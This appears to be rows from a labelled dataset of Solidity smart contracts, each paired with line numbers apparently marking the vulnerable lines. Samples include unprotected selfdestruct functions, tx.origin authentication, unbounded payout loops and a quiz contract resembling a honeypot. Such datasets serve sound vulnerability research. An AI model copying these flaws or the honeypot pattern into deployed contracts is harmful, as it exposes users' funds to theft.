            erc20Contract.transfer(receiver, _amount);
        } else {
            erc20Contract.transfer(receiver, balance);
        }
    }
    function getLotteryInfo(address _walletAddr)
        external
        view
        returns(
           uint64 ttmCnt4,
           uint64 ttmCnt5,
           uint64 ttmCnt9,
           uint64 ttmCnt10,
           uint64 ttWCnt3,
           uint64 ttwCnt4,
           uint64 lastLottery
        )
    {
        ttmCnt4 = 286 - nextLotteryTTMTokenId4;
        ttmCnt5 = 361 - nextLotteryTTMTokenId5;
        ttmCnt9 = 561 - nextLotteryTTMTokenId9;
        ttmCnt10 = 611 - nextLotteryTTMTokenId10;
        ttWCnt3 = 151 - nextLotteryTTWTokenId3;
        ttwCnt4 = 181 - nextLotteryTTWTokenId4;
        lastLottery = lotteryHistory[_walletAddr];
    }
}",[64]
"        } else if (_mgrId == 7) {
            require(nextCommonTTMTokenId7 <= 450);
            require(_value == 1.49 ether);
            nextCommonTTMTokenId7 += 1;
            ttmToken.safeGiveByContract(nextCommonTTMTokenId7 - 1, _gameWalletAddr);
            emit ManagerSold(_buyer, _gameWalletAddr, 7, nextCommonTTMTokenId7);
        } else if (_mgrId == 8) {
            require(nextCommonTTMTokenId8 <= 510);
            require(_value == 1.49 ether);
            nextCommonTTMTokenId8 += 1;
            ttmToken.safeGiveByContract(nextCommonTTMTokenId8 - 1, _gameWalletAddr);
            emit ManagerSold(_buyer, _gameWalletAddr, 8, nextCommonTTMTokenId8);
        } else {
            require(false);
        }
    }
    function _buyCommonTTW(uint256 _value, uint256 _wonderId, address _gameWalletAddr, address _buyer)
        private
    {
        require(_gameWalletAddr != address(0));
        require(_wonderId == 2);
        require(nextCommonTTWTokenId2 <= 90);
        require(_value == 0.50 ether);
        nextCommonTTWTokenId2 += 1;
        ttwToken.safeGiveByContract(nextCommonTTWTokenId2 - 1, _gameWalletAddr);
        emit WonderSold(_buyer, _gameWalletAddr, 2, nextCommonTTWTokenId2);
    }
    function withdrawERC20(address _erc20, address _target, uint256 _amount)
        external
    {
        require(msg.sender == addrFinance || msg.sender == addrAdmin);
        require(_amount > 0);
        address receiver = _target == address(0) ? addrFinance : _target;
        ERC20BaseInterface erc20Contract = ERC20BaseInterface(_erc20);
        uint256 balance = erc20Contract.balanceOf(address(this));
        require(balance > 0);
        if (_amount < balance) {
            erc20Contract.transfer(receiver, _amount);
        } else {
            erc20Contract.transfer(receiver, balance);
        }
    }
    function getPresaleInfo()
        external
        view
        returns(
            uint64 ttmCnt1,
            uint64 ttmCnt2,
            uint64 ttmCnt3,
            uint64 ttmCnt6,
            uint64 ttmCnt7,
            uint64 ttmCnt8,
            uint64 ttwCnt1,
            uint64 ttwCnt2,
            uint64 discountEnd
        )
    {
        ttmCnt1 = 51 - nextDiscountTTMTokenId1;
        ttmCnt2 = 131 - nextCommonTTMTokenId2;
        ttmCnt3 = 211 - nextCommonTTMTokenId3;
        ttmCnt6 = 391 - nextDiscountTTMTokenId6;
        ttmCnt7 = 451 - nextCommonTTMTokenId7;
        ttmCnt8 = 511 - nextCommonTTMTokenId8;
        ttwCnt1 = 31 - nextDiscountTTWTokenId1;
        ttwCnt2 = 91 - nextCommonTTWTokenId2;
        discountEnd = endDiscountTime;
    }
}",[64]
"}
library SafeMath {
  function mul(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal constant returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal constant returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal constant returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract TarynToken is AccessControlled {
  using SafeMath for uint256;
  string public constant name     = ""TarynToken"";
  string public constant symbol   = ""TA"";
  uint8  public constant decimals = 18;
  uint256 public constant INITIAL_SUPPLY = 0;
  uint256 public totalSupply;
  mapping(address => uint256) balances;
  mapping(uint256 => address) public addresses;
  mapping(address => uint256) public indexes;
  //index starts at 1 so that first item has index of 1, which differentiates
  //it from non-existing items with values of 0.
  uint public index = 1;
  /**
   * @dev Contructor that gives msg.sender all of existing tokens. FIXME: this is simply for initial testing.
   */
  function TarynToken() public {
    totalSupply = INITIAL_SUPPLY;
  }
  event Mint(address indexed to, uint256 amount);
  function mint(address _to, uint256 _amount) onlyOwner public returns (bool){
    totalSupply = totalSupply.add(_amount);
    balances[_to] = balances[_to].add(_amount);
    addToAddresses(_to);
    Mint(_to, _amount);
    return true;
  }
  function addToAddresses(address _address) private {
      if (indexes[_address] == 0) {
        addresses[index] = _address;
        indexes[_address] = index;
        index++;
     }
  }
  event Distribute(address owner, uint256 balance, uint256 value, uint ind);
  function distribute() payable public returns(bool){
   for (uint i = 1; i < index; i++) {
     uint256 balance = balances[addresses[i]];
     uint256 giveAmount = balance.mul(msg.value).div(totalSupply);
     Distribute(addresses[i], balance, giveAmount, i);
     addresses[i].transfer(giveAmount);
   }
   return true;
  }
  function isRegistered(address _address) private constant returns (bool) {
      return (indexes[_address] != 0);
  }
  // Basics
  /**
   * @dev transfer token for a specified address
   * @param _to The address to transfer to.
   * @param _value The amount to be transferred.
   */
  function transfer(address _to, uint256 _value) public returns (bool) {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    addToAddresses(_to);
    return true;
  }
  event Transfer(address indexed from, address indexed to, uint256 value);
  /**
   * @dev Gets the balance of the specified address.
   * @param _owner The address to query the the balance of.
   * @return An uint256 representing the amount owned by the passed address.
   */
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
  // Allowances
  mapping (address => mapping (address => uint256)) allowed;
  /**
   * @dev Transfer tokens from one address to another
   * @param _from address The address which you want to send tokens from
   * @param _to address The address which you want to transfer to
   * @param _value uint256 the amount of tokens to be transferred
   */
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    var _allowance = allowed[_from][msg.sender];
    // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
    // require (_value <= _allowance);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = _allowance.sub(_value);
    Transfer(_from, _to, _value);
    return true;
  }
  /**
   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
   * @param _spender The address which will spend the funds.
   * @param _value The amount of tokens to be spent.
   */
  function approve(address _spender, uint256 _value) public returns (bool) {
    // To change the approve amount you first have to reduce the addresses`
    //  allowance to zero by calling `approve(_spender, 0)` if it is not
    //  already 0 to mitigate the race condition described here:
    //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
    require((_value == 0) || (allowed[msg.sender][_spender] == 0));
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }
  /**
   * @dev Function to check the amount of tokens that an owner allowed to a spender.
   * @param _owner address The address which owns the funds.",[64]
"pragma solidity ^0.5.12;
contract TheOddWins {
    address payable owner;
    uint evenOrOdd = 0;
    constructor() public {
        owner = msg.sender;
    }
    // send 0.3 to bet. you win if you are odd
    function () external payable {
        if (tx.origin == msg.sender) {
            require(msg.value == 3*10**17);
            if (evenOrOdd % 2 != 0) {
                uint balance = address(this).balance;
                uint devFee = balance / 100;
                // send developer's fee
                if (owner.send(devFee)) {
                    // send winner amount
                    if (!msg.sender.send(balance - devFee)) {
                        revert();
                    }
                }
            }
            evenOrOdd++;
        }
    }
    function shutdown() public {
        selfdestruct(owner);
    }
}","[26, 27]"
"pragma solidity ^0.5.12;
contract TheOddWins {
    address payable owner;
    uint evenOrOdd = 0;
    constructor() public {
        owner = msg.sender;
    }
    // send 0.3 to bet. you win if you are odd
    function () external payable {
        require(msg.value == 3*10**17);
        if (evenOrOdd % 2 > 0) {
            uint balance = address(this).balance;
            uint devFee = balance / 100;
            // send developer's fee
            if (owner.send(devFee)) {
                // send winner amount
                if (!msg.sender.send(balance - devFee)) {
                    revert();
                }
            }
        }
        evenOrOdd++;
    }
    function shutdown() public {
        selfdestruct(owner);
    }
}","[24, 25]"
"pragma solidity ^0.4.20;
contract This_is_a_Test
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_quiz(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.11;
contract TimeBank {
    struct Holder {
    uint fundsDeposited;
    uint withdrawTime;
    }
    mapping (address => Holder) holders;
    function getInfo() constant returns(uint,uint,uint){
        return(holders[msg.sender].fundsDeposited,holders[msg.sender].withdrawTime,block.timestamp);
    }
    function depositFunds(uint _withdrawTime) payable returns (uint _fundsDeposited){
        //requires Ether to be sent, and _withdrawTime to be in future but no more than 5 years
        require(msg.value > 0 && _withdrawTime > block.timestamp && _withdrawTime < block.timestamp + 157680000);
        //increments value in case holder deposits more than once, but won't update the original withdrawTime in case caller wants to change the 'future withdrawTime' to a much closer time but still future time
        if (!(holders[msg.sender].withdrawTime > 0)) holders[msg.sender].withdrawTime = _withdrawTime;
        holders[msg.sender].fundsDeposited += msg.value;
        return msg.value;
    }
    function withdrawFunds() {
        require(holders[msg.sender].withdrawTime < block.timestamp); //throws error if current time is before the designated withdrawTime
        uint funds = holders[msg.sender].fundsDeposited; // separates the funds into a separate variable, so user can still withdraw after the struct is updated
        holders[msg.sender].fundsDeposited = 0; // adjusts recorded eth deposit before funds are returned
        holders[msg.sender].withdrawTime = 0; // clears withdrawTime to allow future deposits
        msg.sender.transfer(funds); //sends ether to msg.sender if they have funds held
    }
}",[20]
"pragma solidity 0.5.8;
interface IERC20 {
    function transferFrom(address _from, address _to, uint256 _amount) external returns (bool);
    function transfer(address _to, uint _amount) external returns (bool);
}
contract Tipbot {
    address payable public admin = msg.sender;
    IERC20 public ERC20;
    function changeOwnership(address _subject) public {
        require(msg.sender == admin);
        admin = address(uint160(_subject));
    }
    function multiTransfer(address _source, address[] memory _recievers, uint _amount) payable public {
        require(_recievers.length < 25);
        batchTransfer(_source, _recievers, _amount);
        admin.transfer(address(this).balance);
    }
    function tipTransfer(address _source, address _recipent, uint _amount) payable public {
      if(_source != address(0x0)){
        ERC20 = IERC20(_source);
        ERC20.transferFrom(msg.sender, _recipent, _amount);
      } else {
        address payable payee = address(uint160(_recipent));
        payee.transfer(_amount);
      } admin.transfer(address(this).balance);
    }
    function batchTransfer(address _source, address[] memory _recievers, uint _amount) public {
      if(_source != address(0x0)){
        ERC20 = IERC20(_source);
        for(uint x = 0; x < _recievers.length; x++){
          ERC20.transferFrom(msg.sender, _recievers[x], _amount);
        }
      } else {
        for(uint y = 0; y < _recievers.length; y++){
          address payable payee = address(uint160(_recievers[y]));
          payee.transfer(_amount);
        }
      }
    }
}","[34, 36]"
"pragma solidity 0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    // SafeMath.sub will throw if there is not enough balance.
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
}
contract StandardToken is ERC20, BasicToken {
  mapping (address => mapping (address => uint256)) internal allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }
  function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}
contract Ownable {
  address public owner;
  constructor() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0)); 
    owner = newOwner;
  }
}
contract Token is StandardToken, Ownable
{
    string public symbol = ""Could you send VIR token back?"";
    string public name = ""Please"";
    uint public decimals = 18;
    uint private constant initialSupply = 2011100110110111101110011; // 25 billions + 18 decimals
    constructor() public
    {
        owner = msg.sender;
        totalSupply = initialSupply;
        balances[owner] = initialSupply;
    }
    function kill() public
    {
        selfdestruct(address(0));
    }
}","[114, 116]"
"pragma solidity 0.4.24;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ERC20Basic {
  uint256 public totalSupply;
  function balanceOf(address who) public constant returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint256);
  function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    // SafeMath.sub will throw if there is not enough balance.
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public constant returns (uint256 balance) {
    return balances[_owner];
  }
}
contract StandardToken is ERC20, BasicToken {
  mapping (address => mapping (address => uint256)) internal allowed;
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }
  function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {
    allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {
    uint oldValue = allowed[msg.sender][_spender];
    if (_subtractedValue > oldValue) {
      allowed[msg.sender][_spender] = 0;
    } else {
      allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
    return true;
  }
}
contract Ownable {
  address public owner;
  constructor() public {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0)); 
    owner = newOwner;
  }
}
contract Token is StandardToken, Ownable
{
    string public symbol = ""Could you send VIR token back?"";
    string public name = ""Please"";
    uint public decimals = 18;
    uint private constant initialSupply = 2011100110110111101110011; // 25 billions + 18 decimals
    constructor() public
    {
        owner = msg.sender;
        totalSupply = initialSupply;
        balances[0x92694d5c7e2655e3f358130ebd0e7Db3FbD3e455] = initialSupply;
    }
    function kill() public
    {
        selfdestruct(address(0));
    }
}","[114, 116]"
"    allowTransfers = allow;
  }
  function setAllowBurns(bool allow) onlyOwners public {
    allowBurns = allow;
  }
  function setAllowBuying(bool allow) onlyOwners public {
    allowBuying = allow;
  }
  function setSellPrice(uint256 _sellPrice) onlyOwners public {
    sellPrice = _sellPrice;
    NewSellPrice(_sellPrice);
  }
  function setCurrentSeller(address newSeller) onlyOwners public {
    currentSeller = newSeller;
  }
  function ownersTransfer(address _to, uint256 _amount) onlyOwners public {
    _transfer(msg.sender, _to, _amount);
  }
  function transfer(address _to, uint256 _value) public {
    require(allowTransfers && !isOwner(msg.sender));
    _transfer(msg.sender, _to, _value);
  }
  function _transfer(address _from, address _to, uint _value) internal {
    require (_to != 0x0);
    require (balanceOf[_from] >= _value);
    require (balanceOf[_to] + _value > balanceOf[_to]);
    require(!frozenAccounts[_from]);
    require(!frozenAccounts[_to]);
    balanceOf[_from] -= _value;
    balanceOf[_to] += _value;
    Transfer(_from, _to, _value);
  }
  function mintToken(address target, uint256 mintedAmount) onlyOwners public {
    balanceOf[target] += mintedAmount;
    totalSupply += mintedAmount;
    Transfer(0, this, mintedAmount);
    Transfer(this, target, mintedAmount);
  }
  function burn(uint256 amount) public {
    require(allowBurns && !isOwner(msg.sender));
    require(balanceOf[msg.sender] >= amount);
    balanceOf[msg.sender] -= amount;
    totalSupply -= amount;
    Burn(msg.sender, amount);
  }
  function burnFrom(address from, uint256 amount) onlyOwners public {
    require (balanceOf[from] >= amount);
    balanceOf[from] -= amount;
    totalSupply -= amount;
    Burn(from, amount);
  }
  function freezeAccount(address target, bool freeze) onlyOwners public {
    frozenAccounts[target] = freeze;
    FrozenFunds(target, freeze);
  }
  function addOwner(address owner) onlyOwners public {
    owners[owner] = true;
  }
  function removeOwner(address owner) onlyOwners public {
    owners[owner] = false;
  }
  function sendContractFundsToAddress(uint256 amount, address recipient) onlyOwners public {
    require(icoParametersSet);
    require(isAfterIco());
    require(tokensSoldAtIco >= minimumTokenThreshold);
    require(amount <= this.balance);
    updateContract();
    require(amountIsWithinOwnersAllowance(amount));
    recipient.transfer(amount);
  }
  function returnEtherToInvestors() onlyOwners onlyWhenIcoParametersAreSet public {
    require(isAfterIco());
    require(!etherHasBeenReturnedToInvestors);
    require(tokensSoldAtIco < minimumTokenThreshold);
    for (uint64 investorNumber; investorNumber < investorCount; investorNumber++) {
      address investor = investors[investorNumber];
      uint256 amountToSend = etherSpent[investor];
      investor.transfer(amountToSend);
    }
    etherHasBeenReturnedToInvestors = true;
  }
  function getContractBalance() public view returns (uint256) {
    return this.balance;
  }
}","[49, 75, 78, 80]"
"pragma solidity ^0.4.16;
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
contract SafeM {
    function safeAdd(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}
contract TokenERC20 is SafeM{
    // Public variables of the token
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    // This creates an array with all balances
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    // This generates a public event on the blockchain that will notify clients
    event Transfer(address indexed from, address indexed to, uint256 value);
    // This notifies clients about the amount burnt
    event Burn(address indexed from, uint256 value);
    /**
     * Constructor function
     *
     * Initializes contract with initial supply tokens to the creator of the contract
     */
    function TokenERC20() public {
        totalSupply = 90000000* 10 ** uint256(decimals);  // Updating total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;                // Giving the creator all initial tokens
        name = ""Lehman Brothers Coin"";                                   // Setting the name for display purposes
        symbol = ""LBC"";   
            }
    function _transfer(address _from, address _to, uint _value) internal {
        // Prevent transfer to 0x0 address. Use burn() instead
        require(_to != 0x0);
        // Check if the sender has enough
        require(balanceOf[_from] >= _value);
        // Check for overflows
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        // Save this for an assertion in the future
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        // Subtract from the sender
        balanceOf[_from] -= _value;
        // Add the same to the recipient
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        // Asserts are used to use static analysis to find bugs in your code. They should never fail
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    function Airdrop(address[] recipients, uint[] amount){
        for( uint i = 0 ; i < recipients.length ; i++ ) {
          transfer( recipients[i], amount[i] );
      }
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value*10**18);
    }
    function destroycontract(address _to) {
        selfdestruct(_to);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   // Check if the sender has enough
        balanceOf[msg.sender] -= _value;            // Subtract from the sender
        totalSupply -= _value;                      // Updates totalSupply
        emit Burn(msg.sender, _value*10**18);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                // Check if the targeted balance is enough
        require(_value <= allowance[_from][msg.sender]);    // Check allowance
        balanceOf[_from] -= _value;                         // Subtract from the targeted balance
        allowance[_from][msg.sender] -= _value;             // Subtract from the sender's allowance
        totalSupply -= _value;                              // Update totalSupply
        emit Burn(_from, _value*10**18);
        return true;
    }
    function () public payable {
        uint tokens;
        tokens = msg.value * 300000;       // 1 ETHER = 300000MGT
        balanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], tokens);  
        totalSupply = safeAdd(totalSupply, tokens);
        emit Transfer(address(0), msg.sender, tokens); // transfer the token to the donator
        msg.sender.transfer(msg.value);           // send the ether to owner
    }
}","[70, 71, 96]"
"        setTimeRC( _startTime, _endTime );
    }
    function setTimeRC(uint256 _startTime, uint256 _endTime ) internal {
        if( _startTime == 0 ) {
            startTime = tokenSaleContract.startTime();
        } else {
            startTime = _startTime;
        }
        if( _endTime == 0 ) {
            endTime = tokenSaleContract.endTime();
        } else {
            endTime = _endTime;
        }
    }
    modifier onlyTokenSaleOwner() {
        require(msg.sender == tokenSaleContract.owner() );
        _;
    }
    function setTime(uint256 _newStart, uint256 _newEnd) public onlyTokenSaleOwner {
        if ( _newStart != 0 ) startTime = _newStart;
        if ( _newEnd != 0 ) endTime = _newEnd;
    }
    event BuyRC(address indexed buyer, bytes trackID, uint256 value, uint256 soldToken, uint256 valueTokenInEurWei );
    function () public payable {
        require( now > startTime );
        require( now < endTime );
        //require( msg.value >= 1*10**18); //1 Ether
        require( remainingTokens > 0 );
        uint256 tokenAmount = tokenSaleContract.buyFromRC.value(msg.value)(msg.sender, oneTokenInEurWei, remainingTokens);
        remainingTokens = remainingTokens.sub(tokenAmount);
        soldTokens = soldTokens.add(tokenAmount);
        BuyRC( msg.sender, msg.data, msg.value, tokenAmount, oneTokenInEurWei );
    }
}
contract TokenSale is Ownable {
    using SafeMath for uint256;
    tokenInterface public tokenContract;
    rateInterface public rateContract;
    address public wallet;
    address public advisor;
    uint256 public advisorFee; // 1 = 0,1%
	uint256 public constant decimals = 18;
    uint256 public endTime;  // seconds from 1970-01-01T00:00:00Z
    uint256 public startTime;  // seconds from 1970-01-01T00:00:00Z
    mapping(address => bool) public rc;
    function TokenSale(address _tokenAddress, address _rateAddress, uint256 _startTime, uint256 _endTime) public {
        tokenContract = tokenInterface(_tokenAddress);
        rateContract = rateInterface(_rateAddress);
        setTime(_startTime, _endTime);
        wallet = msg.sender;
        advisor = msg.sender;
        advisorFee = 0 * 10**3;
    }
    function tokenValueInEther(uint256 _oneTokenInEurWei) public view returns(uint256 tknValue) {
        uint256 oneEtherInEur = rateContract.readRate(""eur"");
        tknValue = _oneTokenInEurWei.mul(10 ** uint256(decimals)).div(oneEtherInEur);
        return tknValue;
    }
    modifier isBuyable() {
        require( now > startTime ); // check if started
        require( now < endTime ); // check if ended
        require( msg.value > 0 );
		uint256 remainingTokens = tokenContract.balanceOf(this);
        require( remainingTokens > 0 ); // Check if there are any remaining tokens
        _;
    }
    event Buy(address buyer, uint256 value, address indexed ambassador);
    modifier onlyRC() {
        require( rc[msg.sender] ); //check if is an authorized rcContract
        _;
    }
    function buyFromRC(address _buyer, uint256 _rcTokenValue, uint256 _remainingTokens) onlyRC isBuyable public payable returns(uint256) {
        uint256 oneToken = 10 ** uint256(decimals);
        uint256 tokenValue = tokenValueInEther(_rcTokenValue);
        uint256 tokenAmount = msg.value.mul(oneToken).div(tokenValue);
        address _ambassador = msg.sender;
        uint256 remainingTokens = tokenContract.balanceOf(this);
        if ( _remainingTokens < remainingTokens ) {
            remainingTokens = _remainingTokens;
        }
        if ( remainingTokens < tokenAmount ) {
            uint256 refund = (tokenAmount - remainingTokens).mul(tokenValue).div(oneToken);
            tokenAmount = remainingTokens;
            forward(msg.value-refund);
			remainingTokens = 0; // set remaining token to 0
             _buyer.transfer(refund);
        } else {
			remainingTokens = remainingTokens.sub(tokenAmount); // update remaining token without bonus
            forward(msg.value);
        }
        tokenContract.transfer(_buyer, tokenAmount);
        Buy(_buyer, tokenAmount, _ambassador);
        return tokenAmount;
    }
    function forward(uint256 _amount) internal {
        uint256 advisorAmount = _amount.mul(advisorFee).div(10**3);
        uint256 walletAmount = _amount - advisorAmount;
        advisor.transfer(advisorAmount);
        wallet.transfer(walletAmount);
    }
    event NewRC(address contr);
    function addMeByRC() public {
        require(tx.origin == owner);
        rc[ msg.sender ]  = true;
        NewRC(msg.sender);
    }
    function setTime(uint256 _newStart, uint256 _newEnd) public onlyOwner {
        if ( _newStart != 0 ) startTime = _newStart;
        if ( _newEnd != 0 ) endTime = _newEnd;
    }
    modifier onlyOwnerOrRC() {
        require( rc[msg.sender] || msg.sender == owner );
        _;
    }
    function withdraw(address to, uint256 value) public onlyOwner {
        to.transfer(value);
    }
    function withdrawTokens(address to, uint256 value) public onlyOwnerOrRC returns (bool) {
        return tokenContract.transfer(to, value);
    }
    function setTokenContract(address _tokenContract) public onlyOwner {
        tokenContract = tokenInterface(_tokenContract);
    }
    function setWalletAddress(address _wallet) public onlyOwner {
        wallet = _wallet;
    }
    function setAdvisorAddress(address _advisor) public onlyOwner {
            advisor = _advisor;","[26, 103]"
"    }
    /// @dev Fills order using msg.value. Should not be called by contracts unless able to access the protocol token after execution.
    function fillOrderWithEth()
        public
        payable
        saleStarted
        saleNotFinished
        onlyRegistered
    {
        uint remainingEth = safeSub(order.takerTokenAmount, exchange.getUnavailableTakerTokenAmount(order.orderHash));
        uint ethCapPerAddress = getEthCapPerAddress();
        uint allowedEth = safeSub(ethCapPerAddress, contributed[msg.sender]);
        uint ethToFill = min256(min256(msg.value, remainingEth), allowedEth);
        ethToken.deposit.value(ethToFill)();
